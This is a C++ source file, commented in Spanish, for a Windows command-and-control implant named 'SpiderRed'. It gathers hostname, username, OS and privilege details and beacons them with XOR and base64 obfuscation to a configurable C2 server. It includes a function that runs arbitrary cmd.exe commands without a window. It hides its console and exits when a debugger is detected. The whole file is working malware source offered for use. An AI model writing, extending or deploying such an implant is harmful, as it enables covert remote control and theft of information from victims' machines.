// spiderred_agent_fixed.cpp - Agente C2-SpiderRed sin errores
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>  // Para IsUserAnAdmin
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <random>
#include <sstream>
#include <iomanip>
#include <vector>
#include <fstream>
#include <map>
#include <algorithm>
#include <ctime>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")  // Para IsUserAnAdmin
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "127.0.0.1"  // Cambia a la IP de tu servidor
#define C2_PORT 8443
#define C2_PATH "/beacon"
#define USER_AGENT "Mozilla/5.0 SpiderRed-Agent/2.0"
#define MASTER_KEY "DemoKey123!@#"

// ==================== CIFRADO ====================
class Crypto {
public:
    static std::string xor_encrypt(const std::string& data, const std::string& key) {
        std::string result;
        for (size_t i = 0; i < data.size(); i++) {
            result += data[i] ^ key[i % key.size()];
        }
        return result;
    }
    
    static std::string base64_encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        if (len == 0) return "";
        
        std::vector<char> buffer(len);
        if (!CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                                 CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                 buffer.data(), &len)) {
            return "";
        }
        
        return std::string(buffer.data());
    }
    
    static std::string base64_decode(const std::string& input) {
        DWORD len = 0;
        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                                 CRYPT_STRING_BASE64, NULL, &len, NULL, NULL)) {
            return "";
        }
        
        std::vector<BYTE> buffer(len);
        if (!CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                                 CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL)) {
            return "";
        }
        
        return std::string(buffer.begin(), buffer.end());
    }
};

// ==================== RECOLECCIÓN DE INFORMACIÓN ====================
class SystemInfoCollector {
private:
    std::string agent_id;
    
    std::string get_hostname() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (GetComputerNameA(buffer, &size)) {
            return std::string(buffer);
        }
        return "Unknown";
    }
    
    std::string get_username() {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (GetUserNameA(buffer, &size)) {
            return std::string(buffer);
        }
        return "Unknown";
    }
    
    std::string get_os_version() {
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        if (!GetVersionExA((OSVERSIONINFOA*)&osvi)) {
            return "Windows Unknown";
        }
        
        std::stringstream ss;
        ss << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        
        if (osvi.dwMajorVersion == 10) {
            ss << " (10/11)";
        }
        
        return ss.str();
    }
    
    std::string get_architecture() {
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        
        switch (sysInfo.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:
                return "x64";
            case PROCESSOR_ARCHITECTURE_INTEL:
                return "x86";
            case PROCESSOR_ARCHITECTURE_ARM:
                return "ARM";
            case PROCESSOR_ARCHITECTURE_ARM64:
                return "ARM64";
            default:
                return "Unknown";
        }
    }
    
    std::string get_integrity_level() {
        // Método compatible con todas las versiones de Windows
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            return "Unknown";
        }
        
        DWORD dwLength = 0;
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);
        
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            CloseHandle(hToken);
            return "Unknown";
        }
        
        std::vector<BYTE> buffer(dwLength);
        PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)buffer.data();
        
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {
            CloseHandle(hToken);
            return "Unknown";
        }
        
        CloseHandle(hToken);
        
        // Obtener el nivel de integridad
        DWORD dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
        
        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
            return "High";
        } else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID) {
            return "Medium";
        } else {
            return "Low";
        }
    }
    
    std::string get_timestamp() {
        time_t now = time(nullptr);
        char buffer[80];
        struct tm timeinfo;
        localtime_s(&timeinfo, &now);
        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeinfo);
        return std::string(buffer);
    }
    
public:
    SystemInfoCollector() {
        // Generar ID único para el agente
        std::stringstream ss;
        ss << get_hostname() << "-" << get_username() << "-" 
           << GetTickCount() << "-" << rand() % 10000;
        agent_id = ss.str();
    }
    
    std::string collect() {
        std::stringstream json;
        
        json << "{";
        json << "\"agent_id\":\"" << agent_id << "\",";
        json << "\"hostname\":\"" << get_hostname() << "\",";
        json << "\"username\":\"" << get_username() << "\",";
        json << "\"os_version\":\"" << get_os_version() << "\",";
        json << "\"architecture\":\"" << get_architecture() << "\",";
        json << "\"integrity\":\"" << get_integrity_level() << "\",";
        json << "\"timestamp\":\"" << get_timestamp() << "\"";
        json << "}";
        
        return json.str();
    }
    
    std::string get_agent_id() const {
        return agent_id;
    }
};

// ==================== EJECUTOR DE COMANDOS ====================
class CommandExecutor {
public:
    static std::string execute(const std::string& command) {
        // Para seguridad, primero verificamos el comando
        if (command.empty()) {
            return "Error: Empty command";
        }
        
        // Comandos especiales
        if (command == "test") {
            return "Test command executed successfully";
        }
        else if (command == "whoami") {
            return execute_whoami();
        }
        else if (command == "ipconfig") {
            return execute_ipconfig();
        }
        else if (command == "systeminfo") {
            return execute_systeminfo();
        }
        else if (command.substr(0, 3) == "cd ") {
            return execute_cd(command.substr(3));
        }
        else if (command == "pwd" || command == "cd") {
            return execute_pwd();
        }
        else {
            // Comando genérico
            return execute_generic(command);
        }
    }
    
private:
    static std::string execute_whoami() {
        return execute_generic("whoami");
    }
    
    static std::string execute_ipconfig() {
        return execute_generic("ipconfig /all");
    }
    
    static std::string execute_systeminfo() {
        return execute_generic("systeminfo");
    }
    
    static std::string execute_cd(const std::string& path) {
        if (SetCurrentDirectoryA(path.c_str())) {
            char buffer[MAX_PATH];
            GetCurrentDirectoryA(MAX_PATH, buffer);
            return std::string("Changed directory to: ") + buffer;
        } else {
            return "Error: Could not change directory";
        }
    }
    
    static std::string execute_pwd() {
        char buffer[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, buffer);
        return std::string("Current directory: ") + buffer;
    }
    
    static std::string execute_generic(const std::string& command) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            return "Error: Could not create pipe";
        }
        
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
        
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;
        si.dwFlags = STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));
        
        // Crear comando para cmd.exe
        std::string cmd = "cmd.exe /c " + command;
        
        // Crear buffer mutable
        std::vector<char> cmd_buffer(cmd.begin(), cmd.end());
        cmd_buffer.push_back('\0');
        
        if (!CreateProcessA(NULL, cmd_buffer.data(), NULL, NULL, TRUE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            return "Error: Could not create process";
        }
        
        CloseHandle(hWritePipe);
        
        // Esperar a que el proceso termine (máximo 30 segundos)
        WaitForSingleObject(pi.hProcess, 30000);
        
        // Leer salida
        std::string output;
        DWORD bytesRead;
        CHAR buffer[4096];
        
        while (true) {
            if (!ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
                break;
            }
            buffer[bytesRead] = '\0';
            output += buffer;
        }
        
        // Limpiar
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hReadPipe);
        
        return output;
    }
};

// ==================== COMUNICACIÓN CON C2 ====================
class C2Communicator {
private:
    std::string agent_id;
    std::string server;
    int port;
    
public:
    C2Communicator(const std::string& id, const std::string& srv = C2_SERVER, int prt = C2_PORT)
        : agent_id(id), server(srv), port(prt) {}
    
    bool send_beacon(const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT,
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) {
            return false;
        }
        
        HINTERNET hConnect = InternetConnectA(hInternet, server.c_str(), port,
                                            NULL, NULL, INTERNET_SERVICE_HTTP,
                                            0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", C2_PATH,
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_RELOAD |
                                            INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        // Cifrar datos
        std::string encrypted = Crypto::xor_encrypt(data, MASTER_KEY);
        std::string b64_data = Crypto::base64_encode(encrypted);
        
        if (b64_data.empty()) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }
        
        std::string headers = "Content-Type: application/octet-stream\r\n";
        headers += "X-Agent-ID: " + agent_id + "\r\n";
        
        bool success = false;
        if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(),
                            (LPVOID)b64_data.c_str(), (DWORD)b64_data.length())) {
            
            // Leer respuesta (opcional)
            char buffer[1024];
            DWORD bytesRead;
            std::string response;
            
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
            
            if (!response.empty()) {
                // Procesar respuesta si es necesario
                std::string decrypted = Crypto::xor_encrypt(
                    Crypto::base64_decode(response),
                    MASTER_KEY
                );
                // Aquí podrías parsear comandos de la respuesta
            }
            
            success = true;
        }
        
        // Limpiar
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return success;
    }
};

// ==================== AGENTE PRINCIPAL ====================
class SpiderRedAgent {
private:
    SystemInfoCollector sys_info;
    C2Communicator communicator;
    std::atomic<bool> running;
    std::thread beacon_thread;
    
    void beacon_loop() {
        int attempt = 0;
        const int max_attempts = 3;
        
        while (running && attempt < max_attempts) {
            try {
                // Recolectar información del sistema
                std::string system_data = sys_info.collect();
                
                // Enviar beacon al C2
                if (communicator.send_beacon(system_data)) {
                    #ifdef _DEBUG
                    std::cout << "[+] Beacon enviado exitosamente" << std::endl;
                    #endif
                    attempt = 0; // Resetear intentos en éxito
                } else {
                    #ifdef _DEBUG
                    std::cout << "[-] Error enviando beacon" << std::endl;
                    #endif
                    attempt++;
                }
                
                // Esperar antes del siguiente beacon
                int sleep_time = get_sleep_time();
                #ifdef _DEBUG
                std::cout << "[+] Durmiendo " << sleep_time << " segundos..." << std::endl;
                #endif
                
                for (int i = 0; i < sleep_time && running; i++) {
                    Sleep(1000);
                }
                
            } catch (const std::exception& e) {
                #ifdef _DEBUG
                std::cerr << "[!] Excepción: " << e.what() << std::endl;
                #endif
                attempt++;
            } catch (...) {
                #ifdef _DEBUG
                std::cerr << "[!] Excepción desconocida" << std::endl;
                #endif
                attempt++;
            }
        }
        
        if (attempt >= max_attempts) {
            #ifdef _DEBUG
            std::cout << "[!] Demasiados intentos fallidos, terminando..." << std::endl;
            #endif
        }
    }
    
    int get_sleep_time() {
        // Tiempo de espera aleatorio entre 30 y 60 segundos
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(30, 60);
        return dist(gen);
    }
    
    void hide_console() {
        #ifndef _DEBUG
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);
        }
        #endif
    }
    
    bool check_debugger() {
        #ifndef _DEBUG
        if (IsDebuggerPresent()) {
            return true;
        }
        #endif
        return false;
    }
    
public:
    SpiderRedAgent() 
        : sys_info(), 
          communicator(sys_info.get_agent_id()),
          running(false) {
        
        // Configuración inicial
        hide_console();
        
        if (check_debugger()) {
            #ifdef _DEBUG
            std::cout << "[!] Debugger detectado, continuando en modo debug..." << std::endl;
            #else
            ExitProcess(0);
            #endif
        }
        
        #ifdef _DEBUG
        std::cout << "=== SpiderRed Agent ===" << std::endl;
        std::cout << "Agent ID: " << sys_info.get_agent_id() << std::endl;
        std::cout << "C2 Server: " << C2_SERVER << ":" << C2_PORT << std::endl;
        std::cout << "======================" << std::endl;
        #endif
    }
    
    ~SpiderRedAgent() {
        stop();
    }
    
    void start() {
        running = true;
        beacon_thread = std::thread(&SpiderRedAgent::beacon_loop, this);
    }
    
    void stop() {
        running = false;
        if (beacon_thread.joinable()) {
            beacon_thread.join();
        }
    }
    
    void run() {
        start();
        beacon_thread.join();
    }
};

// ==================== FUNCIÓN MAIN SIMPLIFICADA ====================
int main() {
    // Inicializar semilla aleatoria
    srand(static_cast<unsigned int>(time(nullptr)));
    
    // Verificar si estamos ejecutando como administrador (solo para info)
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation,
                               sizeof(elevation), &dwSize)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    #ifdef _DEBUG
    if (isAdmin) {
        std::cout << "[+] Ejecutando con privilegios elevados" << std::endl;
    } else {
        std::cout << "[-] Ejecutando sin privilegios elevados" << std::endl;
    }
    #endif
    
    try {
        SpiderRedAgent agent;
        agent.run();
    }
    catch (const std::exception& e) {
        #ifdef _DEBUG
        std::cerr << "[!] Error fatal: " << e.what() << std::endl;
        #endif
        return 1;
    }
    catch (...) {
        #ifdef _DEBUG
        std::cerr << "[!] Error fatal desconocido" << std::endl;
        #endif
        return 1;
    }
    
    return 0;
}
